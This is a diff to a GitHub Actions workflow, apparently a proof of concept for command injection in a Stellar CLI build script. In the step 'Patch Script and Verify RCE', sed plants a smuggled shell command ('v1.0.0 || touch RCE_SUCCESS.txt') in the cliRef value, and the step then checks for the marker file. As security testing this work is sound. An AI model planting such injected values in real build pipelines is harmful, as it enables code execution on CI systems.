@@ -8,6 +8,7 @@ on:
         required: false
         default: 'main'
         type: string
+        description: "Stellar-cli ref to build against. If empty, will use latest cli version"
 
 jobs:
   build:
@@ -36,12 +37,18 @@ jobs:
         shell: bash
 
       - name: Patch Script and Verify RCE
-        # Yahan humne script ka logic change kar diya hai taake wo hamara payload chala de
         run: |
-          sed -i "s/const cliRef = argv.cliRef || \`v\${latestVersion}\`;/const cliRef = 'v1.0.0; touch RCE_SUCCESS.txt';/" scripts/stellar_cli.mjs
-          pnpm stellar-cli:build -- --cli-ref='v1.0.0'
-          echo "Checking if RCE payload executed:"
+          # Injecting payload via sed to modify the script content dynamically
+          sed -i "s/const cliRef = argv.cliRef || \`v\${latestVersion}\`;/const cliRef = 'v1.0.0 || touch RCE_SUCCESS.txt';/" scripts/stellar_cli.mjs
+          
+          # Running the script
+          # We use '|| true' to ensure the build pipeline doesn't stop immediately
+          pnpm stellar-cli:build -- --cli-ref='v1.0.0' || true
+          
+          # Verification Step
+          echo "--- VERIFICATION START ---"
           ls -la RCE_SUCCESS.txt
+          echo "--- VERIFICATION END ---"
         shell: bash
 
       - name: (temp) Fix CLI links
